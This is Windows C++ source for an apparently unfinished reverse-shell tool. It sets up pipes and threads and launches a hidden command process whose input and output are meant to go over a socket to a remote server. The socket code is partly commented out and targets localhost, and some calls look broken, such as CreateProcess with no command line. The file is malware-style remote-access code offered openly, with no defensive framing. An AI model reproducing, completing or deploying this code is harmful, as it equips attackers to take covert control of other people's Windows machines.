// Includes
#include <stdio.h>
#include <windows.h>
#include <winbase.h>

#include "reverse_shell.h"
#include "pipe_threads.h"

// Declarations
// Private functions
//static SOCKET createSocket();
//static void connectServer(SHELL &shell, int port);
static void createPipes(SHELL &shell, HANDLE &pHStdin, HANDLE &pHStdout);
static void createThreads(SHELL &shell);
static void createProcess(SHELL &shell, HANDLE &pHStdin, HANDLE &pHStdout);
static void printLastError();

/*
    Creates a remote shell.

    Connects to the given port.

    remoteShell blocks! In order to execute the remote shell and continue
    normal execution it is advised to execute a new thread with remoteShell has it's
    thread function.
*/
void remoteShell(LPVOID port)
{
    SHELL shell;

    try
    {
        // Reset shell struct variables
        shell.socket = INVALID_SOCKET;
        shell.hStdoutPipe = NULL;
        shell.hStdoutPipe = NULL;
        shell.hStdinPipe = NULL;
        shell.hProcess = NULL;
        shell.hProcessThread = NULL;
        shell.hStdoutThread = NULL;
        shell.hStdinThread = NULL;

        // Fill shell struct variables

        // Create Socket
        //shell.socket = createSocket();

        // Connect to server - to send error messages if needed
        //connectServer(shell, (int)port);

        // Create Critical Section
        //InitializeCriticalSection(&shell.cs);

        HANDLE pHStdin = NULL;
        HANDLE pHStdout = NULL;

        // Create Pipes
        createPipes(shell, pHStdin, pHStdout);

        // Create Threads
        createThreads(shell);

        // Create Process
        createProcess(shell, pHStdin, pHStdout);

        // Close shell stdin and stdout;
        CloseHandle(pHStdin);
        CloseHandle(pHStdout);

        fprintf(stdout, "[+] Executing Remote Shell...\n");

        // Resume Shell
        ResumeThread(shell.hStdoutThread);  // STDOUT Thread
        ResumeThread(shell.hProcessThread); // CMD Process Main Thread
        CloseHandle(shell.hProcessThread);  // Close shell process thread
        ResumeThread(shell.hStdinThread);   // STDIN Thread

        fprintf(stdout, "[+] Remote Shell executed!\n");

        HANDLE handles[3];
        handles[0] = shell.hProcess;
        handles[1] = shell.hStdinThread;
        handles[2] = shell.hStdoutThread;

        // Wait for one of the handles to finish
        DWORD h = WaitForMultipleObjects(3, handles, FALSE, INFINITE);

        switch(h)
        {
            case WAIT_OBJECT_0: // CMD PROCESS
                TerminateThread(shell.hStdinThread, 0);
                TerminateThread(shell.hStdoutThread, 0);
                break;

            case WAIT_OBJECT_0 + 1: // STDIN THREAD
                TerminateProcess(shell.hProcess, 1);
                TerminateThread(shell.hStdoutThread, 0);
                break;

            case WAIT_OBJECT_0 + 2: // STDOUT THREAD
                TerminateProcess(shell.hProcess, 1);
                TerminateThread(shell.hStdinThread, 0);
                break;

            default:
                TerminateProcess(shell.hProcess, 1);
                TerminateThread(shell.hStdinThread, 0);
                TerminateThread(shell.hStdoutThread, 0);

                printf("[-] WaitForMultipleObjects error!\n");
        }

        // Close socket
        //shutdown(shell.socket, SD_BOTH);    // Disable SEND and RECEIVE from socket
        //closesocket(shell.socket);          // Close socket
        //WSACleanup();                       // Terminates use of Winsock 2 DLL (Ws2_32.dll)

        // Close Handles
        CloseHandle(shell.hProcess);
        CloseHandle(shell.hStdinThread);
        CloseHandle(shell.hStdoutThread);

        // Close Pipes
        CloseHandle(shell.hStdinPipe);
        CloseHandle(shell.hStdoutPipe);

        // Delete Critical Section
        //DeleteCriticalSection(&shell.cs);
    }
    catch(const int &e)
    {
        // Close socket
        // Delete Critical Section

        // Close socket
        shutdown(shell.socket, SD_BOTH);    // Disable SEND and RECEIVE from socket
        closesocket(shell.socket);          // Close socket
        WSACleanup();                       // Terminates use of Winsock 2 DLL (Ws2_32.dll)

        // Delete Critical Section
        DeleteCriticalSection(&shell.cs);

        if(e > 2)
        {
            // Detach Handles
            CloseHandle(shell.hStdoutPipe);    // STDOUT Pipe
            CloseHandle(shell.hStdinPipe);     // STDIN Pipe
            CloseHandle(shell.hStdoutThread);  // STDOUT Pipe Thread
            CloseHandle(shell.hStdinThread);   // STDIN Pipe Thread
        }
    }/*
    catch()  // Create Socket Failed
    {

    }
    catch()     // Create Critical Section Failed
    {
        // Close socket
    }
    catch()     // Create Pipes Failed
    {
        // Close socket
        // Delete Critical Section
    }
    catch()     // Create Process Failed
    {
        // Close socket
        // Delete Critical Section
        // Close pipes
    }
    catch()     // Create Threads Failed
    {
        // Close socket
        // Delete Critical Section
        // Close pipes
        // Close process
    }
    */

    ExitThread(0);
}

static SOCKET createSocket()
{
    fprintf(stdout, "--> Creating Socket...\n");

    WSADATA wsaData;

    // Initialize Winsock
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
    {
        fprintf(stdout, "[-] WSAStartup failed!\n");
        throw 2;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if(s == INVALID_SOCKET)
    {
        fprintf(stdout, "[-] Socket creation failed!\n");
        throw 2;
    }

    fprintf(stdout, "[+] Created Socket\n");

    return s;
}

static void connectServer(SHELL &shell, int port)
{
    fprintf(stdout, "--> Connecting to Server...\n");

    sockaddr_in recv_addr;
    recv_addr.sin_family = AF_INET;
    recv_addr.sin_port = htons(port);
    recv_addr.sin_addr.s_addr = inet_addr("localhost");

    if(connect(shell.socket, (sockaddr*)&recv_addr, sizeof(recv_addr)) == SOCKET_ERROR)
    {
        fprintf(stdout, "[-] Connection to Server failed!\n");
        throw 2;
    }

    fprintf(stdout, "[+] Connected\n");
}

static void createPipes(SHELL &shell, HANDLE &pHStdin, HANDLE &pHStdout)
{
    fprintf(stdout, "--> Creating Pipes...\n");

    // Create Security Attributes for the I/O pipes for the shell
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.lpSecurityDescriptor = NULL; // Use default ACL
    sec_attr.bInheritHandle = TRUE; // Shell will inherit handles

        // Create STDIN Pipe
    if(!CreatePipe(&pHStdin, &shell.hStdinPipe, &sec_attr, 0))
    {
        CloseHandle(shell.hStdoutPipe);

        fprintf(stdout, "[-] CreatePipe - STDIN\n");
        printLastError();

        // TODO - Send error message/socket to server

        throw 0;
    }

    fprintf(stdout, "[+] CreatePipe - STDIN\n");

    // Create STDOUT Pipe
    if(!CreatePipe(&shell.hStdoutPipe, &pHStdout, &sec_attr, 0))
    {

        fprintf(stdout, "[-] CreatePipe - STDOUT\n");
        printLastError();

        // TODO - Send error message/socket to server

        throw 0;
    }

    fprintf(stdout, "[+] CreatePipe - STDOUT\n");
}

static void createThreads(SHELL &shell)
{
    fprintf(stdout, "--> Creating Threads...\n");

    // Initialize Security Attributes
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(SECURITY_ATTRIBUTES);
    sec_attr.lpSecurityDescriptor = NULL;   // Default ACL
    sec_attr.bInheritHandle = FALSE;    // No inheritance

    // Create STDOUT thread
    shell.hStdoutThread = CreateThread(&sec_attr, 0, (LPTHREAD_START_ROUTINE)&stdoutThread, (LPVOID)&shell, CREATE_SUSPENDED, NULL);

    if(shell.hStdoutThread == NULL)
    {
        // Send error message to socket

        fprintf(stdout, "[-] CreateThread - STDOUT\n");
        printLastError();

        throw 3;
    }

    fprintf(stdout, "[+] CreatedThread - STDOUT\n");

    // Create STDIN thread
    shell.hStdinThread = CreateThread(&sec_attr, 0, (LPTHREAD_START_ROUTINE)&stdinThread, (LPVOID)&shell, CREATE_SUSPENDED, NULL);

    if(shell.hStdinThread == NULL)
    {
        TerminateThread(shell.hStdoutThread, 0);    // STDOUT was the first created thread, if we reach this point that
                                                    // means we successfully created the STDOUTThread, therefore we must now
                                                    // terminate it

        // TODO - Send error message/code to server

        fprintf(stdout, "[-] CreateThread - STDIN\n");
        printLastError();

        throw 3;
    }

    fprintf(stdout, "[+] CreateThread - STDIN \n");
}

static void createProcess(SHELL &shell, HANDLE &pHStdin, HANDLE &pHStdout)
{
    fprintf(stdout, "--> Creating CMD Process...\n");

    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    // Initialize process startup info
    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpDesktop = NULL;
    si.lpTitle = NULL;      //  This parameter must be NULL for GUI or console processes that do not create a new console window
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.cbReserved2 = 0;
    si.lpReserved2 = NULL;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;   // Use different STDIN and STDOUT handles, and wShowWindow defines to not show cmd window

    // Make stdin and stdout of CMD the pipes
    si.hStdInput  = pHStdin;
    si.hStdOutput = pHStdout;
    si.hStdError = pHStdout;

    //DuplicateHandle(GetCurrentProcess(), shell.hStdoutPipe, GetCurrentProcess(), &si.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0); // Make STDERR go to STDOUT

    // Create process in suspended state
    if(CreateProcess(NULL, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        shell.hProcess = pi.hProcess;
        shell.hProcessThread = pi.hThread;
    }
    else    // FAIL
    {
        fprintf(stdout, "[-] CMD Failed\n");
        printLastError();

        // TODO - Send error message/code to server

        throw 1;
    }

    // SUCCESS

    fprintf(stdout, "[+] CMD Created\n");
}

static void printLastError()
{
    char *err_str = NULL;

    DWORD flags = FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    FormatMessageA(flags, NULL, GetLastError(), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPSTR)&err_str, 0, NULL);

    fprintf(stdout, "[-] Error: %s\n", err_str);

    free(err_str);
}

// Test threads
